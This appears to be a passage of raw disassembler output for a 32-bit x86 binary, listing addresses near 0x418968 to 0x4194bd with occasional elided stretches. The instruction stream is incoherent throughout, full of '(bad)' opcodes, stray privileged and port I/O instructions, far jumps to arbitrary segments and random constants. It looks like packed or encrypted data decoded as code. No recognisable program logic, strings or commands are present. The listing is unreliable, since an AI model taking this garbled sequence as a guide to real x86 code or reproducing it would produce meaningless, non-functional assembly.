  418968:	int    0x7
  41896a:	jno    0x41891f
  41896c:	jmp    0x418986
  41896e:	mov    WORD PTR [ebx-0x7fa974f7],es
  418974:	adc    BYTE PTR [ebx-0xe],0xeb
  418978:	xor    DWORD PTR [ebx],edx
  41897a:	mov    esi,0x25808f7b
  41897f:	jecxz  0x4189f5
  418981:	aam    0x58
  418983:	into   
  418984:	cmc    
  418985:	sub    ecx,DWORD PTR [ebp-0x31]
  418988:	mov    ds:0x8acdf053,eax
  41898d:	push   cs
  41898e:	test   DWORD PTR [edi-0x5ed7cc0d],esi
  418994:	pop    esi
  418995:	imul   edi,ebx,0xaf3c932
  41899b:	mov    al,cl
  41899d:	jno    0x418988
  41899f:	sar    DWORD PTR [eax-0x47],1
  4189a2:	sub    al,0x34
  4189a4:	cdq    
  4189a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189a6:	nop
  4189a7:	aad    0xe7
  4189a9:	mov    bl,0x89
  4189ab:	loop   0x418996
  4189ad:	dec    eax
  4189ae:	popa   
  4189af:	sub    esi,DWORD PTR [edi-0x43]
  4189b2:	(bad)  
  4189b3:	in     al,dx
  4189b4:	sub    DWORD PTR [ecx+0x1eec82cc],edx
  4189ba:	xor    cl,ch
  4189bc:	stos   DWORD PTR es:[edi],eax
  4189bd:	mov    edx,DWORD PTR [edi]
  4189bf:	inc    ebp
  4189c0:	xchg   ebp,eax
  4189c1:	jns    0x4189c3
	...
  418a33:	add    BYTE PTR [edi],ch
  418a35:	stos   DWORD PTR es:[edi],eax
  418a36:	cdq    
  418a37:	inc    ecx
  418a38:	popf   
  418a39:	jae    0x418a3a
  418a3b:	out    dx,eax
  418a3c:	inc    esp
  418a3d:	dec    edi
  418a3e:	(bad)  
  418a3f:	clc    
  418a40:	or     BYTE PTR [edi-0x45],dh
  418a43:	jb     0x418a41
  418a45:	or     eax,DWORD PTR [ecx]
  418a47:	add    dh,dh
  418a49:	add    BYTE PTR [eax],al
  418a4b:	add    BYTE PTR [edx+0x63],bl
  418a4e:	cwde   
  418a4f:	dec    esp
  418a50:	cld    
  418a51:	pusha  
  418a52:	fdiv   DWORD PTR [eax+0x777a0fd4]
  418a58:	pop    ss
  418a59:	xor    ebx,DWORD PTR [ecx+0x7a]
  418a5c:	xor    BYTE PTR [ecx-0x6a42ed74],cl
  418a62:	or     BYTE PTR [edi],dh
  418a64:	fs jne 0x4189ea
  418a67:	(bad)  
  418a68:	add    al,0x62
  418a6a:	mov    esp,0x3e734e03
  418a6f:	mov    al,ds:0x449d6245
  418a74:	sahf   
  418a75:	xlat   BYTE PTR ds:[ebx]
  418a76:	loop   0x418a7b
  418a78:	pop    esp
  418a79:	inc    esi
  418a7a:	dec    esi
  418a7b:	scas   al,BYTE PTR es:[edi]
  418a7c:	dec    esi
  418a7d:	and    DWORD PTR [ecx+edx*1],esi
  418a80:	aaa    
  418a81:	hlt    
  418a82:	retf   
  418a83:	push   ss
  418a84:	out    dx,eax
  418a85:	dec    eax
  418a86:	and    DWORD PTR [edx+0x68],0xc0c1aef9
  418a8d:	dec    edi
  418a8e:	dec    esi
  418a8f:	aad    0xde
  418a91:	xchg   esi,eax
  418a92:	dec    ebp
  418a93:	mov    WORD PTR [ebp+0x73],ds
  418a96:	(bad)  
  418a97:	add    al,bh
  418a99:	jbe    0x418a90
  418a9b:	(bad)  
  418a9c:	or     bl,BYTE PTR [edi-0x6d1da93b]
  418aa2:	test   ebx,ecx
  418aa4:	retf   
  418aa5:	test   BYTE PTR [ebx],cl
  418aa7:	loop   0x418abf
  418aa9:	out    dx,al
  418aaa:	sub    esi,DWORD PTR [ecx-0x1e]
  418aad:	loop   0x418a93
  418aaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ab0:	(bad)  
  418ab1:	dec    esp
  418ab2:	jecxz  0x418b07
  418ab4:	ror    edi,0x96
  418ab7:	xchg   esi,eax
  418ab8:	cmp    eax,0xf9b22e29
  418abd:	ins    DWORD PTR es:[edi],dx
  418abe:	enter  0xa89c,0x6f
  418ac2:	mov    esp,0x31acf317
  418ac7:	js     0x418ae9
  418ac9:	adc    bh,dh
  418acb:	jp     0x418af5
  418acd:	cwde   
  418ace:	sbb    eax,0x898efa2b
  418ad3:	dec    ebp
  418ad4:	loope  0x418ad0
  418ad6:	push   ebp
  418ad7:	jmp    0xc852:0x7c76ae5c
  418ade:	hlt    
  418adf:	pop    eax
  418ae0:	sbb    DWORD PTR [esi+eiz*2+0x4263335f],eax
  418ae7:	fimul  WORD PTR [edx+0x76]
  418aea:	retf   0x69c
  418aed:	loope  0x418a82
  418aef:	sbb    DWORD PTR ss:[ebp+0x4f],ebx
  418af3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418af4:	frstor [edi+0x1270b7a1]
  418afa:	call   0x5924998e
  418aff:	dec    edi
  418b00:	dec    eax
  418b01:	jne    0x418b71
  418b03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b04:	jno    0x418b41
  418b06:	hlt    
  418b07:	push   esp
  418b08:	jne    0x418aa9
  418b0a:	(bad)
  418b0e:	arpl   WORD PTR [ebx-0x4d],dx
  418b11:	mov    ah,bl
  418b13:	rol    BYTE PTR [eax+eax*8],1
  418b16:	out    dx,al
  418b17:	ja     0x418b93
  418b19:	cmp    eax,0xf09c4aee
  418b1e:	mov    al,ds:0xaaaec69
  418b23:	adc    esi,DWORD PTR [edi-0x1a634cb8]
  418b29:	pop    es
  418b2a:	lock sbb dl,ah
  418b2d:	xor    ebx,DWORD PTR [edi]
  418b2f:	jbe    0x418ab9
  418b31:	daa    
  418b32:	stos   DWORD PTR es:[edi],eax
  418b33:	mov    ds:0xef3e57d,al
  418b38:	out    dx,al
  418b39:	rcl    DWORD PTR [edx],cl
  418b3b:	pop    edx
  418b3c:	mov    eax,DWORD PTR [edx]
  418b3e:	jge    0x418af9
  418b40:	or     eax,0x2b
	...
  418bb1:	add    BYTE PTR [eax],al
  418bb3:	add    BYTE PTR [ecx-0x267b6f40],cl
  418bb9:	aam    0x9d
  418bbb:	int    0x19
  418bbd:	xchg   edx,eax
  418bbe:	clc    
  418bbf:	(bad)  
  418bc0:	lea    ecx,[edx*2+0x10cf20a]
  418bc7:	add    dh,dh
  418bc9:	add    BYTE PTR [eax],al
  418bcb:	add    BYTE PTR [edx+0x4ef14d2d],cl
  418bd1:	(bad)  
  418bd2:	fadd   DWORD PTR [edx-0x2374e786]
  418bd8:	or     eax,0x117ef982
  418bdd:	or     al,0x64
  418bdf:	popa   
  418be0:	stc    
  418be1:	faddp  st(7),st
  418be3:	mov    es,WORD PTR [eax+eax*1+0x2726a7d]
  418bea:	mov    cl,0xdd
  418bec:	loope  0x418c51
  418bee:	jg     0x418c33
  418bf0:	sbb    bh,BYTE PTR [edx*2-0x3d0f05f0]
  418bf7:	fimul  DWORD PTR [edx]
  418bf9:	out    0x48,eax
  418bfb:	xor    DWORD PTR [edx-0x38304bef],ebx
  418c01:	je     0x418c44
  418c03:	mov    dl,0xfb
  418c05:	sbb    dh,BYTE PTR [ebx+ecx*1-0x3e]
  418c09:	jecxz  0x418c3c
  418c0b:	scas   al,BYTE PTR es:[edi]
  418c0c:	push   ebx
  418c0d:	inc    ecx
  418c0e:	mov    bh,0x1a
  418c10:	or     al,BYTE PTR [eax-0x54]
  418c13:	adc    dl,BYTE PTR [ebx-0x1def8a7a]
  418c19:	bound  eax,QWORD PTR [ebp+0x1c1b3201]
  418c1f:	test   BYTE PTR [ecx-0x5f6011de],dl
  418c25:	inc    edi
  418c26:	inc    edi
  418c27:	jecxz  0x418c0d
  418c29:	xchg   esp,eax
  418c2a:	xchg   esp,eax
  418c2b:	sti    
  418c2c:	jl     0x418c1b
  418c2e:	jne    0x418c56
  418c30:	mov    edx,0x5c889921
  418c35:	sub    dh,dh
  418c37:	xor    BYTE PTR [edi+esi*8+0x3cc7ad8b],bl
  418c3e:	pop    ebx
  418c3f:	pop    esp
  418c40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c41:	add    bh,BYTE PTR [ebx+0x25]
  418c44:	mov    dh,BYTE PTR [ecx-0x22323607]
  418c4a:	into   
  418c4b:	aas    
  418c4c:	pushf  
  418c4d:	sbb    DWORD PTR [esi+0x77cde421],edi
  418c53:	dec    eax
  418c54:	cmc    
  418c55:	push   es
  418c56:	xchg   ebx,eax
  418c57:	cmp    eax,0xd584923e
  418c5c:	mov    ?,eax
  418c5e:	jl     0x418c8c
  418c60:	gs inc esp
  418c62:	sub    cl,BYTE PTR [ebp-0x3b7c80e7]
  418c68:	and    dh,ah
  418c6a:	push   ss
  418c6b:	int3   
  418c6c:	(bad)  
  418c6d:	pop    ebx
  418c6e:	ins    DWORD PTR es:[edi],dx
  418c6f:	push   edx
  418c70:	test   eax,0x354438ea
  418c75:	or     al,0x2c
  418c77:	mov    edx,0xfe0a2cb1
  418c7c:	xchg   DWORD PTR [edi+0x4a809c4],ecx
  418c82:	add    ecx,esi
  418c84:	retf   0x35e9
  418c87:	popa   
  418c88:	push   0xfffffffd
  418c8a:	jl     0x418c1c
  418c8c:	xor    ebx,esi
  418c8e:	lea    ebp,[esi-0x5b]
  418c91:	sahf   
  418c92:	aas    
  418c93:	add    ebx,DWORD PTR [esi-0x6f3d426a]
  418c99:	hlt    
  418c9a:	jne    0x418c61
  418c9c:	or     al,0xd4
  418c9e:	add    BYTE PTR [eax+0x25],dl
  418ca1:	ror    BYTE PTR [esi],cl
  418ca3:	push   cs
  418ca4:	push   ebp
  418ca5:	mov    cl,0xca
  418ca7:	sub    ebx,edi
  418ca9:	push   es
  418caa:	in     al,0xa2
  418cac:	lea    ebx,[edx+eax*2-0x63]
  418cb0:	push   ebx
  418cb1:	dec    ebp
  418cb2:	push   edx
  418cb4:	int    0x4d
  418cb6:	push   cs
  418cb7:	sub    esi,DWORD PTR [edx-0x72ba9c47]
  418cbd:	and    dh,bh
  418cbf:	mov    ebp,0x4608
	...
  418d34:	pop    ss
  418d35:	arpl   WORD PTR ds:0x5f7f7d53,bx
  418d3b:	addr16 in eax,dx
  418d3d:	inc    eax
  418d3e:	jmp    0x2b8d0f61
  418d43:	jg     0x418d2d
  418d45:	or     eax,0xf60001
  418d4a:	add    BYTE PTR [eax],al
  418d4c:	jp     0x418d42
  418d4e:	xchg   edx,eax
  418d4f:	call   0xbfb510f6
  418d54:	retf   0xc3a1
  418d57:	je     0x418db6
  418d59:	jmp    0x9ec7:0x2b5a7390
  418d60:	outs   dx,DWORD PTR ds:[esi]
  418d61:	cmp    al,0xe9
  418d63:	je     0x418d5f
  418d65:	ins    BYTE PTR es:[edi],dx
  418d66:	push   ebx
  418d67:	adc    DWORD PTR [edi+0x5f],0x8625faab
  418d6e:	jle    0x418cf4
  418d70:	not    DWORD PTR [ebp+0xbc66d28]
  418d76:	mov    al,ds:0xa9d1021f
  418d7b:	xor    ebp,DWORD PTR [esi-0x71]
  418d7e:	imul   ebx,DWORD PTR [esi+edi*8],0x41
  418d82:	enter  0xa0a3,0xe7
  418d86:	push   DWORD PTR [ecx+edi*2-0x27]
  418d8a:	mov    esi,0x7742fa7b
  418d8f:	scas   eax,DWORD PTR es:[edi]
  418d90:	sbb    eax,0x99e0c5d2
  418d95:	imul   ecx,DWORD PTR [edx],0x9e120d6e
  418d9b:	mov    edx,0x8338fb08
  418da0:	mov    DWORD PTR [edi-0x18322404],edi
  418da6:	(bad)  
  418da7:	std    
  418da8:	push   ecx
  418da9:	mov    dh,BYTE PTR [eax+eax*1]
  418dac:	fcomp  QWORD PTR [ebx+eiz*1]
  418daf:	stos   DWORD PTR es:[edi],eax
  418db0:	mov    ecx,0x905b7b70
  418db5:	or     bl,BYTE PTR [ebp-0x22]
  418db8:	in     eax,0x67
  418dba:	ins    DWORD PTR es:[edi],dx
  418dbb:	hlt    
  418dbc:	push   cs
  418dbd:	or     DWORD PTR [eax+ecx*1-0x49],0xb8282a36
  418dc5:	enter  0x631f,0x45
  418dc9:	add    BYTE PTR [ebp+0xbbdba29],0xb9
  418dd0:	loopne 0x418e11
  418dd2:	(bad)  
  418dd3:	std    
  418dd4:	ja     0x418e1e
  418dd6:	out    dx,al
  418dd7:	mov    ecx,0xa941b7c2
  418ddc:	dec    ebp
  418ddd:	pop    edx
  418dde:	xchg   edi,eax
  418ddf:	xchg   BYTE PTR [edi],ch
  418de1:	cmp    cl,bl
  418de3:	adc    al,0x9b
  418de5:	or     BYTE PTR [esi-0x224a0718],0x1b
  418dec:	popa   
  418ded:	mov    ah,0xc4
  418def:	jmp    0x418e34
  418df1:	xlat   BYTE PTR ds:[ebx]
  418df2:	adc    eax,0x4aa3d4e
  418df7:	push   0xf8cfc1c4
  418dfc:	mov    al,0xc9
  418dfe:	bound  edi,QWORD PTR [eax]
  418e00:	fidiv  WORD PTR gs:[esi]
  418e03:	cmp    dh,ah
  418e05:	leave  
  418e06:	in     al,dx
  418e07:	inc    edx
  418e08:	xchg   BYTE PTR [edi+0x5aeb23e1],ah
  418e0e:	and    al,0xd4
  418e10:	movlps xmm1,QWORD PTR [esi-0x31]
  418e14:	jb     0x418e40
  418e16:	sub    BYTE PTR [edx+edx*1],ch
  418e19:	xchg   esp,eax
  418e1a:	xchg   edx,eax
  418e1b:	mov    esi,0x230ff539
  418e20:	fdiv   QWORD PTR [edx]
  418e22:	je     0x418ea2
  418e24:	ret    0x293f
  418e27:	out    0xf7,al
  418e29:	cmp    DWORD PTR [edx],eax
  418e2b:	enter  0xd89b,0xd2
  418e2f:	or     esi,esp
  418e31:	clc    
  418e32:	pop    ebx
  418e33:	add    edx,DWORD PTR [ecx-0x44bbe30e]
  418e39:	clc    
  418e3a:	cmp    eax,0xbd662fa5
  418e3f:	outs   dx,BYTE PTR ds:[esi]
  418e40:	push   ebp
  418e41:	cmp    DWORD PTR [eax],eax
	...
  418eb3:	add    BYTE PTR [edx-0x1a],ah
  418eb6:	out    0x3b,al
  418eb8:	out    0x3b,al
  418eba:	(bad)  
  418ebb:	push   DWORD PTR [eax-0x20]
  418ebe:	jecxz  0x418eb9
  418ec0:	xchg   esi,eax
  418ec1:	cmc    
  418ec2:	shl    BYTE PTR [ecx-0x22],cl
  418ec5:	push   cs
  418ec6:	add    DWORD PTR [eax],eax
  418ec8:	test   BYTE PTR [eax],0x0
  418ecb:	add    BYTE PTR [eax-0x11ba925f],dl
  418ed1:	push   ecx
  418ed2:	int3   
  418ed3:	xor    esp,esi
  418ed5:	sbb    al,0x47
  418ed7:	and    esi,DWORD PTR [ebx]
  418ed9:	mov    gs,esp
  418edb:	mov    cl,0xa8
  418edd:	pop    esi
  418ede:	dec    eax
  418edf:	pop    ebp
  418ee0:	mov    DWORD PTR [ecx*2+0x4bd1d6e7],ebp
  418ee7:	push   0xffffffce
  418ee9:	xor    eax,DWORD PTR [ebp-0x571290bd]
  418eef:	rcr    bh,cl
  418ef1:	stos   DWORD PTR es:[edi],eax
  418ef2:	or     edx,edx
  418ef4:	jnp    0x418ea7
  418ef6:	push   eax
  418ef7:	lds    ebp,FWORD PTR [esi+eiz*1+0x78108ad8]
  418efe:	sub    ebp,DWORD PTR [edi+ebp*8+0x4ac21b06]
  418f05:	fadd   DWORD PTR [edx-0x4b622dcd]
  418f0b:	ror    BYTE PTR [edi-0x2b],1
  418f0e:	inc    ebp
  418f0f:	iret   
  418f10:	inc    esp
  418f11:	xchg   ebx,eax
  418f12:	test   eax,0x644f961
  418f17:	in     eax,0xe7
  418f19:	mov    ch,0xdf
  418f1b:	push   edx
  418f1c:	lds    ebp,FWORD PTR [eax+0x7dea092c]
  418f22:	mov    gs,WORD PTR [edx]
  418f24:	retf   0xc10d
  418f27:	and    ebp,0xffffffe6
  418f2a:	in     al,0x14
  418f2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f2d:	dec    eax
  418f2e:	scas   al,BYTE PTR es:[edi]
  418f2f:	xor    ebx,DWORD PTR [esi+0x49b40986]
  418f35:	mov    ah,0x8a
  418f37:	pop    ebx
  418f38:	cdq    
  418f39:	mov    al,ds:0x6ca83cbd
  418f3e:	cdq    
  418f3f:	test   eax,0x3ebe6f7f
  418f44:	sti    
  418f45:	mov    dl,0x1f
  418f47:	adc    ecx,ebx
  418f49:	jno    0x418f13
  418f4b:	fistp  DWORD PTR [ebp+ebp*1+0x661a0f70]
  418f52:	mov    ds:0xd5e51934,al
  418f57:	mov    DWORD PTR [esi-0x13fea438],ebx
  418f5d:	imul   edx
  418f5f:	push   ebp
  418f60:	sbb    ah,al
  418f62:	jecxz  0x418f1c
  418f64:	push   ds
  418f65:	mov    al,BYTE PTR [ebp+0x16]
  418f68:	jmp    0x418fe0
  418f6a:	adc    al,0x9
  418f6c:	(bad)  
  418f6d:	adc    ah,BYTE PTR [esp+edi*8]
  418f70:	and    BYTE PTR [edx+ecx*1-0x5c],al
  418f74:	pusha  
  418f75:	push   ds
  418f76:	sub    DWORD PTR [ecx-0x1],0xe68efd9c
  418f7d:	fisttp QWORD PTR [eax]
  418f7f:	jg     0x418f6e
  418f81:	cdq    
  418f82:	pusha  
  418f83:	mov    ds:0x5858d839,al
  418f88:	(bad)  
  418f89:	fdivr  QWORD PTR [esi-0x2b]
  418f8c:	jns    0x418f8b
  418f8e:	or     BYTE PTR [ecx+0x285d9466],0x78
  418f95:	scas   eax,DWORD PTR es:[edi]
  418f96:	pop    edx
  418f97:	push   es
  418f98:	sbb    ebp,eax
  418f9a:	sbb    eax,0x4475938d
  418f9f:	neg    esi
  418fa1:	push   0xb805a17a
  418fa6:	jl     0x419005
  418fa8:	jb     0x418f33
  418faa:	iret   
  418fab:	sbb    bh,BYTE PTR [ebx+ebp*2]
  418fae:	push   ebp
  418faf:	inc    DWORD PTR [edi-0x110e361d]
  418fb5:	adc    DWORD PTR [esi+ebx*1],edx
  418fb8:	xchg   esi,eax
  418fb9:	pop    edx
  418fba:	mov    eax,0xbe9c1812
  418fbf:	jmp    0x0:0xe8e3
	...
  419032:	add    BYTE PTR [eax],al
  419034:	test   eax,0xff456b7e
  419039:	push   ebp
  41903a:	scas   eax,DWORD PTR es:[edi]
  41903b:	(bad)  
  41903c:	out    dx,eax
  41903d:	mov    ch,0xb6
  41903f:	shl    BYTE PTR [ecx-0x2b452336],cl
  419045:	sgdtd  [eax]
  419048:	test   BYTE PTR [eax],0x0
  41904b:	add    BYTE PTR [eax-0x1d],ah
  41904e:	or     eax,0x86fb5666
  419053:	sahf   
  419054:	arpl   WORD PTR [esi-0x14a4e1a8],di
  41905a:	sub    BYTE PTR [eax+eax*2+0x793c590e],0x7
  419062:	push   0xffffffec
  419064:	repnz cmp BYTE PTR [edi],al
  419067:	xchg   ecx,eax
  419068:	or     eax,0x2f3305b6
  41906d:	xchg   BYTE PTR [edx-0x2e],dh
  419070:	neg    DWORD PTR [ecx-0x1686300a]
  419076:	fwait
  419077:	in     al,dx
  419078:	xchg   edi,eax
  419079:	lods   al,BYTE PTR ds:[esi]
  41907a:	and    bl,BYTE PTR [esi+0x22]
  41907d:	fsubr  DWORD PTR [esi+0x5692a5bc]
  419083:	mov    bl,dl
  419085:	xor    DWORD PTR [edx-0x267504a],edi
  41908b:	xor    al,0x19
  41908d:	add    al,0xcf
  41908f:	mov    edx,0xebba4665
  419094:	cmp    dl,ah
  419096:	adc    al,dl
  419098:	adc    BYTE PTR [edi],ah
  41909a:	mov    ebx,0x4a2f750b
  41909f:	xchg   ecx,eax
  4190a0:	in     eax,dx
  4190a1:	mov    dl,0xd8
  4190a3:	jmp    FWORD PTR [ebx+0x2abe12ed]
  4190a9:	dec    ecx
  4190aa:	push   es
  4190ab:	sbb    al,0x1c
  4190ad:	clc    
  4190ae:	icebp  
  4190af:	xchg   ecx,eax
  4190b0:	js     0x4190a2
  4190b2:	push   edx
  4190b3:	pop    esi
  4190b4:	repz push esp
  4190b6:	fwait
  4190b7:	call   0xf2baa92f
  4190bc:	fistp  DWORD PTR [eax-0x412ad474]
  4190c2:	jne    0x41905c
  4190c4:	jge    0x419144
  4190c6:	arpl   WORD PTR [ecx+esi*1],bp
  4190c9:	or     ebp,DWORD PTR [ebx+0x429903b1]
  4190cf:	mov    BYTE PTR [edx+0x1570ddb0],bl
  4190d5:	fsub   QWORD PTR [eax]
  4190d7:	add    edi,ebx
  4190d9:	stc    
  4190da:	sti    
  4190db:	sbb    DWORD PTR [ebx+0xe50a562],esp
  4190e1:	adc    eax,0xcff2327c
  4190e6:	mov    eax,DWORD PTR [ebx]
  4190e8:	and    eax,DWORD PTR [edi]
  4190ea:	pushf  
  4190eb:	cwde   
  4190ec:	mov    ds:0x407dee89,eax
  4190f1:	into   
  4190f2:	push   ss
  4190f3:	or     edx,0x41
  4190f6:	pop    ebp
  4190f7:	cdq    
  4190f8:	(bad)  
  4190f9:	mov    eax,ds:0x203edfea
  4190fe:	ins    BYTE PTR es:[edi],dx
  4190ff:	push   DWORD PTR [ebx]
  419101:	loope  0x419160
  419103:	aad    0xc6
  419105:	outs   dx,DWORD PTR ds:[esi]
  419106:	sbb    BYTE PTR [edi],dl
  419108:	out    dx,al
  419109:	(bad)  
  41910a:	xor    eax,0xdc3d8f1b
  41910f:	lock pop ebp
  419111:	add    al,0x65
  419113:	retf   0xdd7d
  419116:	xor    BYTE PTR [eax+0x19c084ad],al
  41911c:	call   0xdf1c:0xfb39bc13
  419123:	mov    dh,0x8b
  419125:	mov    ch,0x6f
  419127:	push   es
  419128:	sub    eax,DWORD PTR [ecx-0x28]
  41912b:	addr16 push 0x2b6abd52
  419131:	stos   BYTE PTR es:[edi],al
  419132:	ja     0x419110
  419134:	push   0x4e3f70c7
  419139:	pop    es
  41913a:	mov    ch,0xc2
  41913c:	iret   
  41913d:	xor    eax,0xce7b3e7e
	...
  4191b2:	add    BYTE PTR [eax],al
  4191b4:	aaa    
  4191b5:	xchg   edx,eax
  4191b6:	and    al,0x83
  4191b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191b9:	mov    bh,0xb7
  4191bb:	mov    dh,0xb3
  4191bd:	cmp    al,0x9b
  4191bf:	scas   eax,DWORD PTR es:[edi]
  4191c0:	jnp    0x41921e
  4191c2:	addr16 and edx,ecx
  4191c5:	adc    BYTE PTR [ecx],al
  4191c7:	add    dh,dh
  4191c9:	add    BYTE PTR [eax],al
  4191cb:	add    dh,ch
  4191cd:	rol    BYTE PTR [edi+0x36],1
  4191d0:	bound  edx,QWORD PTR [ecx+edx*4-0x6b]
  4191d4:	stos   BYTE PTR es:[edi],al
  4191d5:	(bad)  
  4191d6:	dec    edi
  4191d7:	dec    DWORD PTR [edx+0x5a379118]
  4191dd:	add    DWORD PTR [ebp*1-0x238542e0],ebp
  4191e4:	xchg   ebp,eax
  4191e5:	mov    al,0x19
  4191e7:	adc    ch,BYTE PTR [ebx+0x7c9fa48e]
  4191ed:	das    
  4191ee:	mov    dh,0x61
  4191f0:	inc    eax
  4191f1:	jmp    0x419202
  4191f3:	push   ebp
  4191f4:	lahf   
  4191f5:	mov    BYTE PTR [eax],ah
  4191f7:	and    ch,BYTE PTR [eax]
  4191f9:	aas    
  4191fa:	loopne 0x4191fc
  4191fc:	jmp    0x419216
  4191fe:	stos   BYTE PTR es:[edi],al
  4191ff:	and    al,0x8a
  419201:	jmp    FWORD PTR [esi]
  419203:	jmp    0x8f02:0x418f8dae
  41920a:	pusha  
  41920b:	loop   0x41925f
  41920d:	xchg   ebx,eax
  41920e:	or     cl,BYTE PTR [edi+0x7de18a73]
  419214:	ins    DWORD PTR es:[edi],dx
  419215:	inc    ebx
  419216:	daa    
  419217:	or     dh,BYTE PTR [edi]
  419219:	jmp    0x419291
  41921b:	es pop esi
  41921d:	jmp    0xd1ee8389
  419222:	push   0x50
  419224:	jae    0x41927c
  419226:	xor    eax,0x7d467543
  41922b:	test   ebx,esp
  41922d:	mov    ebp,0x2df4639a
  419232:	fild   WORD PTR [edi+0x599044a7]
  419238:	xchg   esi,eax
  419239:	dec    edx
  41923a:	sub    DWORD PTR [edx+edx*8],edi
  41923d:	push   es
  41923e:	pop    esp
  41923f:	add    BYTE PTR [edx+0x365e8baa],bh
  419245:	cld    
  419246:	imul   eax,DWORD PTR [esi+0x39f9baf0],0xffffffbd
  41924d:	or     ch,BYTE PTR gs:[edx+ebx*1]
  419251:	inc    esp
  419252:	push   edx
  419253:	add    ebp,edx
  419255:	jo     0x4191ed
  419257:	sbb    BYTE PTR [eax+0x159c81b1],al
  41925d:	cmp    ebp,DWORD PTR cs:[edx+edi*8-0x6e91c69b]
  419265:	cmc    
  419266:	icebp  
  419267:	fimul  DWORD PTR [edi]
  419269:	mov    al,0x9e
  41926b:	add    cl,dl
  41926d:	cmp    al,0xdc
  41926f:	add    eax,0xca75e740
  419274:	jmp    0x41920f
  419276:	ins    DWORD PTR es:[edi],dx
  419277:	push   0x5f
  419279:	int    0xcf
  41927b:	sbb    BYTE PTR [esi],ah
  41927d:	sub    ecx,DWORD PTR [ecx-0x3adf291a]
  419283:	push   cs
  419284:	fwait
  419285:	pop    ds
  419286:	fld    QWORD PTR ds:0x1176f368
  41928c:	retf   0x3d78
  41928f:	push   ecx
  419290:	push   0xffffff95
  419292:	leave  
  419293:	mov    edx,ebp
  419295:	dec    edx
  419296:	adc    dl,bl
  419298:	cmp    eax,ebx
  41929a:	hlt    
  41929b:	in     eax,0x26
  41929d:	add    eax,0x6339a2cd
  4192a2:	int3   
  4192a3:	or     BYTE PTR [ecx-0x6f4dcf11],0x73
  4192aa:	pop    edi
  4192ab:	dec    edx
  4192ac:	mov    es,WORD PTR [eax+0x16756775]
  4192b2:	rol    DWORD PTR [esi],cl
  4192b4:	push   esp
  4192b5:	and    eax,0xa250fb05
  4192ba:	int3   
  4192bb:	out    0xef,al
  4192bd:	fs fxch st(5)
  4192c0:	lea    edi,[ebx]
	...
  419332:	add    BYTE PTR [eax],al
  419334:	fdiv   QWORD PTR [ebx-0x2380afc1]
  41933a:	(bad)  
  41933b:	mov    edi,0xbcd03e15
  419340:	xor    eax,0xc0e2b6b0
  419345:	adc    DWORD PTR [ecx],eax
  419347:	add    dh,dh
  419349:	add    BYTE PTR [eax],al
  41934b:	add    BYTE PTR [edi+0x232e3dfc],bl
  419351:	hlt    
  419352:	jo     0x41939b
  419354:	pop    edi
  419355:	cmp    DWORD PTR [esi+0x72f26dcc],eax
  41935b:	in     al,dx
  41935c:	sub    dl,BYTE PTR [edi]
  41935e:	sar    DWORD PTR [edx-0x54390a16],1
  419364:	iret   
  419365:	mov    esp,0x7f6233c
  41936a:	jmp    0x41934f
  41936c:	xchg   edx,eax
  41936d:	sub    BYTE PTR [ebp+0x69],0x39
  419371:	lahf   
  419372:	xchg   ecx,eax
  419373:	xchg   ebx,eax
  419374:	jmp    0x6c8edadb
  419379:	int    0x1
  41937b:	shl    DWORD PTR [esi-0x53],1
  41937e:	in     al,dx
  41937f:	push   ecx
  419380:	imul   eax,esi,0xee6f99fa
  419386:	cs mov dh,0x67
  419389:	adc    DWORD PTR [eax-0x58],ecx
  41938c:	sbb    BYTE PTR [esi+0x57],al
  41938f:	(bad)  
  419390:	int    0x31
  419392:	cli    
  419393:	add    ebx,ecx
  419395:	scas   al,BYTE PTR es:[edi]
  419396:	mov    ds:0x2e276bc9,eax
  41939b:	pop    ebx
  41939c:	scas   eax,DWORD PTR es:[edi]
  41939d:	lahf   
  41939e:	gs (bad) 
  4193a0:	xchg   esi,eax
  4193a1:	repnz dec esp
  4193a3:	sbb    al,0x1e
  4193a5:	scas   eax,DWORD PTR es:[edi]
  4193a6:	push   edi
  4193a7:	fiadd  DWORD PTR [eax-0x30865c2]
  4193ad:	cmp    bh,ch
  4193af:	mov    DWORD PTR [ebx],edi
  4193b1:	fs inc esi
  4193b3:	ror    BYTE PTR [ebp-0x5090e959],1
  4193b9:	mov    ds:0xde1187f8,al
  4193be:	push   ds
  4193bf:	add    BYTE PTR [edx+ebp*2+0x1a],al
  4193c3:	mov    ebp,?
  4193c5:	jo     0x41943f
  4193c7:	(bad)  [edi+0x8e52c25]
  4193cd:	adc    dh,0xd0
  4193d0:	or     esi,eax
  4193d2:	push   ss
  4193d3:	sbb    ah,BYTE PTR [edi]
  4193d5:	les    esp,FWORD PTR [edx]
  4193d7:	cmp    DWORD PTR [edx+0xe800394],edi
  4193dd:	pop    esp
  4193de:	mov    esi,0x7ed9b741
  4193e3:	mov    bh,0x1b
  4193e5:	fldcw  WORD PTR [ecx+0x5a838489]
  4193eb:	jmp    0xa227:0xdb80f798
  4193f2:	ins    BYTE PTR es:[edi],dx
  4193f3:	fistp  QWORD PTR [edx+0x71bc7b76]
  4193f9:	fadd   DWORD PTR es:[ecx+edi*1+0x4d]
  4193fe:	mov    ds:0x44189185,eax
  419403:	rcl    BYTE PTR [esi-0x6f50a409],1
  419409:	dec    ecx
  41940a:	inc    ebx
  41940b:	adc    eax,0xbfd5f8ff
  419410:	jbe    0x419480
  419412:	icebp  
  419413:	sub    eax,0x2ed2ea54
  419418:	sbb    al,0x7a
  41941a:	mov    eax,ds:0x84a65b37
  41941f:	jmp    0x565e:0xd5871fcf
  419426:	je     0x419417
  419428:	ins    BYTE PTR es:[edi],dx
  419429:	stc    
  41942a:	push   0x36b04218
  41942f:	aam    0x74
  419431:	inc    esi
  419432:	xchg   ecx,eax
  419433:	leave  
  419434:	nop
  419435:	mov    bh,BYTE PTR [edi-0xebb4e93]
  41943b:	mov    ah,0x2f
  41943d:	or     esp,DWORD PTR [eax+0x4503e2]
	...
  4194b3:	add    BYTE PTR [ecx-0x7],al
  4194b6:	mov    ebx,ebx
  4194b8:	mov    ebx,0x95fb51fb
  4194bd:	fidivr WORD PTR [ebx+0x2c]
